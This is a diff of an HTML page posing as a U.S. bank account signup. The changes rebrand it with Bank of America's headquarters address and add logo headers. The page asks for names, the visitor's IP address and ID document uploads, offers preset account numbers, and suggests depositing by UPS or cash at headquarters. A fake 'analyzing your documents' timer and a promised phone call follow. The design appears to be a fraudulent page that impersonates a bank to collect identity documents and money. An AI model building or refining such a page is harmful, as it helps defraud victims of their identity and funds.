@@ -1,39 +1,64 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Open USA Bank Account</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Headquarters.Bank of America Corporate Center, 100 North Tryon Street, Charlotte, NC 28255.</title>
   <style>
     body {
-      font-family: Arial, sans-serif;
-      background-color: #f4f4f4;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #e9eff5;
       margin: 0;
-      padding: 20px;
+      padding: 0;
     }
     .container {
-      background: #fff;
+      background: #ffffff;
       max-width: 600px;
-      margin: auto;
+      margin: 40px auto;
       padding: 30px;
-      border-radius: 8px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      border-radius: 10px;
+      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.1);
     }
-    h2 {
-      text-align: center;
+    .header {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 20px;
+    }
+    .header img {
+      width: 40px;
+      height: 40px;
+      margin-right: 10px;
+    }
+    .header h2 {
+      font-size: 22px;
       color: #2c3e50;
+      margin: 0;
     }
     label {
       display: block;
       margin-top: 15px;
-      font-weight: bold;
+      font-weight: 600;
+      color: #34495e;
     }
     input, select, button {
       width: 100%;
       padding: 10px;
       margin-top: 8px;
       border: 1px solid #ccc;
-      border-radius: 4px;
+      border-radius: 5px;
+      font-size: 15px;
+    }
+    button {
+      background-color: #3498db;
+      color: white;
+      font-weight: bold;
+      border: none;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+    button:hover {
+      background-color: #2980b9;
     }
     .hidden { display: none; }
     #timer {
@@ -44,8 +69,12 @@
   </style>
 </head>
 <body>
+
 <div class="container" id="page1">
-  <h2>Open a U.S. Bank Account</h2>
+  <div class="header">
+    <img src="holop.png" alt="Logo">
+    <h2>Headquarters.Bank of America Corporate Center, 100 North Tryon Street, Charlotte, NC 28255.</h2>
+  </div>
   <label>First Name</label>
   <input type="text" id="firstName">
 
@@ -68,7 +97,10 @@
 </div>
 
 <div class="container hidden" id="page2">
-  <h2>Register Your Device</h2>
+  <div class="header">
+    <img src="holop.png" alt="Logo">
+    <h2>Register Your Device</h2>
+  </div>
   <label>IP Address</label>
   <input type="text" id="ip">
 
@@ -87,7 +119,10 @@
 </div>
 
 <div class="container hidden" id="page3">
-  <h2>Choose Your Account Details</h2>
+  <div class="header">
+    <img src="holop.png" alt="Logo">
+    <h2>Choose Your Account Details</h2>
+  </div>
   <label>Select Account Number</label>
   <select id="accountNumber">
     <option>084267390275</option>
@@ -106,7 +141,10 @@
 </div>
 
 <div class="container hidden" id="page4">
-  <h2>Identity Verification</h2>
+  <div class="header">
+    <img src="holop.png" alt="Logo">
+    <h2>Identity Verification</h2>
+  </div>
   <label>Upload Front Side of ID</label>
   <input type="file">
 
@@ -117,12 +155,18 @@
 </div>
 
 <div class="container hidden" id="loading">
-  <h2>Hold on, we're analyzing your documents and details</h2>
+  <div class="header">
+    <img src="holop.png" alt="Logo">
+    <h2>Hold on, we're analyzing your documents and details</h2>
+  </div>
   <div id="timer">2:00</div>
 </div>
 
 <div class="container hidden" id="deposit">
-  <h2>How Do You Want to Deposit?</h2>
+  <div class="header">
+    <img src="holop.png" alt="Logo">
+    <h2>Select Deposit Method</h2>
+  </div>
   <select>
     <option>UPS</option>
     <option>Cash Deposit at Headquarters</option>
@@ -134,7 +178,10 @@
 </div>
 
 <div class="container hidden" id="thanks">
-  <h2>Thank you for your submission</h2>
+  <div class="header">
+    <img src="holop.png" alt="Logo">
+    <h2>Thank You</h2>
+  </div>
   <p>We'll reach you soon over the call regarding the updates.</p>
 </div>
 
@@ -181,5 +228,6 @@
     document.getElementById('thanks').classList.remove('hidden');
   }
 </script>
+
 </body>
 </html>
